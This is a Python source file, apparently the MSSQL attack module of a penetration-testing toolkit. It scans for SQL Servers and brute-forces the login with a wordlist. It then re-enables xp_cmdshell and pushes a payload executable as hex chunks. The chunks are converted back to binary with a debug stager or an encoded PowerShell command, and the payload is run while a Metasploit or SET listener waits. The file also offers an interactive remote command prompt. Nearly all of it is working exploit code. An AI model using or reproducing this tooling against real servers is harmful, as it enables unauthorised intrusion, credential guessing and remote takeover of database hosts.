#!/usr/bin/python
from src.core.setcore import *
import _mssql
import sys
import subprocess
import socket
import re
import os
import time
import binascii
import base64
import shutil

#
# this is the mssql modules
#

# define the base path
definepath = definepath()
operating_system = check_os()

msf_path = meta_path()

# this is for the initial discovery for scanning
def scan(range,lowport,highport):
    # scan the ranges
    from src.core import portscan
    portscan=portscan.launch(range, lowport, highport)
    # if we returned values
    if portscan != False:
        return portscan
    # if nothing is returned
    if portscan == False:
        print_warning("No MSSQL servers were found in the ranges specified")
        return False
    # return the portscan value
    return portscan

#
# this is the brute forcer
#
def brute(ipaddr,username,port,wordlist):
    # if ipaddr being passed is invalid
    if ipaddr == "":
        return False
    if ipaddr != "":
        # base counter for successful brute force
        counter = 0
        # build in quick wordlist
        if wordlist == "default":
            wordlist = "src/fasttrack/wordlist.txt"

        # read in the file
        password = file(wordlist, "r")
        for passwords in password:
            passwords = passwords.rstrip()
            # try actual password
            try:
                print "Attempting to brute force " + bcolors.BOLD + ipaddr + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC
                # connect to the sql server and attempt a password
                target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
                # print that we were successful
                print_status("\nSuccessful login with username %s and password: %s" % (username, passwords))
                counter = 1
                break

            # if invalid password
            except Exception, e:
                pass

        # if we brute forced a machine
        if counter == 1:
            return ipaddr + "," + username + "," + str(port) + "," + passwords
        # else we didnt and we need to return a false
        else:
            if ipaddr != '':
                print_warning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
            return False


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr,port,username,password,option):
    # connect to SQL server
    target_server = _mssql.connect(ipaddr + ":" + str(port), username, password)
    print_status("Connection established with SQL Server...")
    print_status("Converting payload to hexadecimal...")
    # if we are using a SET interactive shell payload then we need to make the path under web_clone versus ~./set
    if os.path.isfile(setdir + "/set.payload"):
        web_path = (setdir + "/web_clone/")
    # then we are using metasploit
    if not os.path.isfile(setdir + "/set.payload"):
        if operating_system == "posix":
            web_path = (setdir)
            subprocess.Popen("cp %s/msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
            subprocess.Popen("cp %s//msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
    fileopen = file("%s/msf.exe" % (web_path), "rb")
    # read in the binary
    data = fileopen.read()
    # convert the binary to hex
    data = binascii.hexlify(data)
    # we write out binary out to a file
    filewrite = file(setdir + "/payload.hex", "w")
    filewrite.write(data)
    filewrite.close()

    # if we are using metasploit, start the listener
    if not os.path.isfile(setdir + "/set.payload"):
        if operating_system == "posix":
            import pexpect
            print_status("Starting the Metasploit listener...")
            child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config" % (msf_path,setdir))

    # random executable name
    random_exe = generate_random_string(10,15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #

    if option == "1":
        # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
        powershell_command = unicode("""$s=gc "payload.hex";$s=[string]::Join('',$s);$s=$s.Replace('`r','');$s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)| % {$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes("payload.exe",$b);""")

        ########################################################################################################################################################################################################
        #
        # there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
        # in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
        #
        ########################################################################################################################################################################################################

        # blank command will store our fixed unicode variable
        blank_command = ""
        # loop through each character and insert null byte
        for char in powershell_command:
            # insert the nullbyte
            blank_command += char + "\x00"

        # assign powershell command as the new one
        powershell_command = blank_command
        # base64 encode the powershell command
        powershell_command = base64.b64encode(powershell_command)
        # this will trigger when we are ready to convert

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #
    if option == "2":
        print_status("Attempting to re-enable the xp_cmdshell stored procedure if disabled..")
        # reconfigure the stored procedure and re-enable
        try:
            target_server.execute_query("EXEC master.dbo.sp_configure 'show advanced options', 1")
            target_server.execute_query("RECONFIGURE")
            target_server.execute_query("EXEC master.dbo.sp_configure 'xp_cmdshell', 1")
            target_server.execute_query("RECONFIGURE")
        except: pass
        # we selected hex to binary
        fileopen = file("src/payloads/hex2binary.payload", "r")
        # specify random filename for deployment
        print_status("Deploying initial debug stager to the system.")
        random_file = generate_random_string(10,15)
        for line in fileopen:
            # remove bogus chars
            line = line.rstrip()
            # make it printer friendly to screen
            print_line = line.replace("echo e", "")
            print_status("Deploying stager payload (hex): " + bcolors.BOLD + str(print_line) + bcolors.ENDC)
            target_server.execute_query("xp_cmdshell '%s>> %s'" % (line,random_file))
        print_status("Converting the stager to a binary...")
        # here we convert it to a binary
        target_server.execute_query("xp_cmdshell 'debug<%s'" % (random_file))
        print_status("Conversion complete. Cleaning up...")
        # delete the random file
        target_server.execute_query("xp_cmdshell 'del %s'" % (random_file))

    # here we start the conversion and execute the payload
    print_status("Sending the main payload via to be converted back to a binary.")
    # read in the file 900 bytes at a time
    fileopen = file(setdir + "/payload.hex", "r")
    while fileopen:
        data = fileopen.read(900).rstrip()
        # if data is done then break out of loop because file is over
        if data == "": break
        print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
        target_server.execute_query("xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
    print_status("Delivery complete. Converting hex back to binary format.")

    # if we are using debug conversion then convert our binary
    if option == "2":
        target_server.execute_query("xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
        target_server.execute_query("xp_cmdshell '%s %s'" % (random_file, random_exe))
        # clean up the old files
        print_status("Cleaning up old files..")
        target_server.execute_query("xp_cmdshell 'del %s'" % (random_exe))

    # if we are using SET payload
    if os.path.isfile(setdir + "/set.payload"):
        print_status("Spawning seperate child process for listener...")
        try: shutil.copyfile(setdir + "/web_clone/x", definepath)
        except: pass

        # start a threaded webserver in the background
        subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
        # grab the port options

        if check_options("PORT=") != 0:
            port = check_options("PORT=")

        # if for some reason the port didnt get created we default to 443
        else:
            port = "443"

        # launch the python listener through pexpect
        # need to change the directory real quick
        os.chdir(definepath)

        # now back
        os.chdir(setdir + "/web_clone/")

    print_status("Pausing 10 seconds to let the system catch up...")
    time.sleep(10)
    print_status("Triggering payload stager...")
    # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
    import thread
    # execute the payload
    # we append more commands if option 1 is used
    if option == "1":
        random_exe_execute = random_exe
        random_exe = "powershell -EncodedCommand " + powershell_command

    sql_command = ("xp_cmdshell '%s'" % (random_exe))
    # start thread of SQL command that executes payload
    thread.start_new_thread(target_server.execute_query, (sql_command,))
    time.sleep(1)
    # trigger the exe if option 1 is used
    if option == "1":
        sql_command = ("xp_cmdshell '%s'" % (random_exe_execute))
        thread.start_new_thread(target_server.execute_query, (sql_command,))
    # if pexpect doesnt exit right then it freaks out
    if os.path.isfile(setdir + "/set.payload"):
        os.system("python ../../payloads/set_payloads/listener.py")
    try:
        # interact with the child process through pexpect
        child2.interact()
        try:
            os.remove("x")
        except: pass
    except: pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr,port,username,password,option):
    # connect to SQL server
    mssql = _mssql.connect(ipaddr + ":" + str(port), username, password)
    print_status("Connection established with SQL Server...")
    print_status("Attempting to re-enable xp_cmdshell if disabled...")
    try:
        mssql.execute_query("EXEC master.dbo.sp_configure 'show advanced options', 1")
        mssql.execute_query("RECONFIGURE")
        mssql.execute_query("EXEC master.dbo.sp_configure 'xp_cmdshell', 1")
        mssql.execute_query("RECONFIGURE")
    except Exception, e: pass
    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
    mssql.select_db('master')
    while 1:
        # cmdshell command
        cmd = raw_input("xp_cmdshell> ")
        # exit if we want
        if cmd == "quit" or cmd == "exit": break
        mssql.execute_query("xp_cmdshell '%s'" % (cmd))
        if cmd != "":
            for line in mssql:
                # formatting for mssql output
                line = str(line)
                line = line.replace("', 'output': '", "\n")
                line = line.replace("{0: '", "")
                line = line.replace("'}", "")
                line = line.replace("{0: None, 'output': None}", "")
                line = line.replace("\\r", "")
                line = line.replace("The command completed with one or more errors.", "")
                print line
